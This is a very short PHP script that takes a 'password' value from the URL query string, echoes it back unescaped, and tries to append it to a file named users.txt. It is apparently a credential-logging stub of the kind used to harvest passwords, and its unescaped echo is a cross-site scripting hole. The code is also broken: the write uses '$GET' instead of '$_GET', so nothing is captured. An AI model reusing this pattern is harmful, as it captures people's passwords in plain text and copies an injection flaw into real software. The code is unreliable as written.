<?php
$handle = fopen("users.txt", "a");
echo $_GET['password'];

fwrite($handle, $GET['password']);
fclose($handle);

exit;
?> 
